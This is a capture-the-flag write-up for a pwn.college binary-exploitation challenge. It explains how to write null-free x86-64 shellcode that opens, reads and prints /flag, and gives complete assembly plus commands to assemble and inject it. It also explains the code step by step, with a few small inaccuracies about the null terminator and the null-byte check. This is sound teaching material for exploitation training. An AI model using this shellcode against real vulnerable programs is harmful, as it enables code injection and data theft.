# üß† Write-Up: Pwn College ‚Äì Null-Free Shellcode

## üîí Challenge Name

**`null-free-shellcode`**
*From the Binary Exploitation module on Pwn College.*

---

## üéØ Challenge Goal

You are asked to write shellcode that:

1. **Opens** the file `/flag`
2. **Reads** its contents
3. **Prints** it to stdout (typically using file descriptor `1`)

But with a twist:

> ‚ùó Your shellcode **must contain no null bytes (`0x00`)**, meaning any opcode or data containing a null byte will be **filtered out and rejected**.

---

## üîç Technical Constraints

* **64-bit Linux executable (ELF)**
* Uses **code injection**: shellcode is read into memory and executed
* Shellcode input size: 0x1000 bytes
* **PIE**: enabled, but irrelevant since you control RIP
* **NX bit**: unknown, but **stack is executable**
* Environment variables and file descriptors > 2 are sanitized
* **Your shellcode must be null-free**

---

## ‚ö†Ô∏è Key Obstacle

In classic shellcode:

```nasm
mov rax, 0x0
push rax             ; pushes 8 null bytes (null terminator)
```

But here, `push rax` will introduce **null bytes** (`\x00\x00\x00\x00\x00\x00\x00\x00`) in the shellcode, which will be filtered out.

Similarly, instructions like:

```nasm
mov edi, 1         ; \xbf\x01\x00\x00\x00  ‚Üê contains nulls
```

are not allowed either.

---

## üß† Strategy & Thought Process

### üî∏ Step 1: Understand the problem

**Why do we normally need a null terminator?**

Because the `open()` syscall expects a **C-style string** ‚Äî i.e., a pointer to a null-terminated string like `"/flag\0"`. Without the `\0`, it might read extra junk or fail.

But we **can‚Äôt inject a null byte** in our shellcode directly.

---

### üî∏ Step 2: Look for ways to trick the system

Here comes the clever part:

> In **Unix filesystems**, it is perfectly legal to open `"////flag"` ‚Äî it's treated **exactly the same** as `"/flag"`.

### ‚úÖ Insight:

> So instead of trying to null-terminate `"/flag"`, we can pad it with extra slashes `"////"` to fill 8 bytes (64 bits) ‚Äî giving us a full word to push **without any null bytes**.

This eliminates the need to push a null terminator at all.

---

## ‚úÖ Final Shellcode (null-free)

```nasm
section .text
global _start

_start:
    xor     rax, rax                         ; Clear RAX to prepare for syscalls
    push    rax                              ; Stack alignment (and later buffer use)
    
    ; Push the string "////flag" (reversed due to little-endian)
    mov     rbx, 0x67616c662f2f2f2f          ; "////flag"
    push    rbx
    mov     rdi, rsp                         ; rdi -> pointer to "/flag"

    ; Open syscall
    mov     al, 2                            ; syscall number for open()
    xor     rsi, rsi                         ; flags = 0 (O_RDONLY)
    xor     rdx, rdx                         ; mode = 0 (not used in O_RDONLY)
    syscall                                  ; open("/flag", 0, 0)

    ; Read syscall
    mov     rdi, rax                         ; rdi = file descriptor from open()
    mov     rsi, rsp                         ; rsi = buffer on stack
    mov     dl, 0x40                         ; rdx = number of bytes to read (64)
    xor     eax, eax                         ; syscall number for read (0)
    syscall

    ; Write syscall
    xor     edi, edi                         ; edi = 0
    inc     edi                              ; edi = 1 (stdout)
    xor     eax, eax                         ; eax = 0
    inc     eax                              ; eax = 1 (syscall number for write)
    syscall

    ; Exit syscall
    xor     eax, eax                         ; clear eax
    mov     al, 60                           ; syscall number for exit()
    xor     edi, edi                         ; exit(0)
    syscall
```

---

## üí° Explanation of Every Step

| Instruction                   | Purpose                                                             |
| ----------------------------- | ------------------------------------------------------------------- |
| `xor rax, rax`                | Clears `rax` to 0. Used both for syscall numbers and pushing nulls. |
| `push rax`                    | Stack alignment and buffer use (no effect on `/flag`).              |
| `mov rbx, 0x67616c662f2f2f2f` | Constructs string `"////flag"` in reverse (little-endian).          |
| `push rbx`                    | Pushes the fake "/flag" onto the stack.                             |
| `mov rdi, rsp`                | Sets `rdi` to point to the string `/flag`.                          |
| `mov al, 2`                   | `open()` syscall number (on x86\_64).                               |
| `xor rsi, rsi`                | `rsi` = 0 ‚Üí O\_RDONLY flag                                          |
| `xor rdx, rdx`                | `rdx` = 0 ‚Üí mode is ignored in O\_RDONLY                            |
| `syscall`                     | Executes `open("/flag", 0, 0)`                                      |
| `mov rdi, rax`                | `rdi` = returned file descriptor                                    |
| `mov rsi, rsp`                | `rsi` = buffer to read into (stack)                                 |
| `mov dl, 0x40`                | `rdx` = 64 bytes                                                    |
| `xor eax, eax`                | syscall number = 0 (read)                                           |
| `syscall`                     | Executes `read(fd, buf, 64)`                                        |
| `xor edi, edi` / `inc edi`    | Sets `edi` = 1 (stdout)                                             |
| `xor eax, eax` / `inc eax`    | Sets `eax` = 1 (write)                                              |
| `syscall`                     | Executes `write(1, buf, 64)`                                        |
| `mov al, 60`                  | syscall number for `exit()`                                         |
| `xor edi, edi`                | exit code = 0                                                       |
| `syscall`                     | Exits cleanly                                                       |

---

## üö´ Why Null Bytes Were a Problem

### Example:

```nasm
mov edi, 1       ; => bf 01 00 00 00
```

This contains **nulls**: `\x00\x00\x00`.

Nulls act as **string terminators** for input in many C-based programs. So the input filter in this challenge stops parsing your shellcode at the first `\x00`.

That‚Äôs why instructions like `mov edi, 1` or `push 0` or anything that results in nulls must be replaced.

---

## üí° Trick Summary / Shellcode Design Lessons

| Trick / Concept           | Description                                                      |
| ------------------------- | ---------------------------------------------------------------- |
| Avoid `\x00` bytes        | Use `xor`, `inc`, or load custom values instead of direct nulls  |
| Unix ignores repeated `/` | `"////flag"` is treated like `"/flag"`                           |
| Push strings in reverse   | x86 is little-endian ‚Äî strings must be pushed backwards          |
| Stack as buffer           | Use `rsp` for storing the read buffer to avoid allocating memory |
| Use registers wisely      | XOR + INC avoids nulls in immediate values                       |
| Clean exit with `exit(0)` | Avoid leaving zombie processes or triggering segfaults           |

---

## üìù Takeaway for Future Challenges

When writing shellcode under constraints:

1. **Know what instructions produce nulls**
2. **Substitute them with equivalent sequences**
3. **Use system behavior creatively** ‚Äî like Unix‚Äôs tolerance for repeated slashes

---

## üß™ Testing

To test this:

1. Assemble with `nasm`:

```bash
nasm -f bin -o null_free_shellcode.bin null_free_shellcode.asm
```

2. Check for null bytes:

```bash
xxd null_free_shellcode.bin | grep '00'  # Should output nothing
```

3. Run inside the challenge with:

```bash
cat null_free_shellcode.bin | /challenge/binary-exploitation-null-free-shellcode
```

You should see the flag printed out.
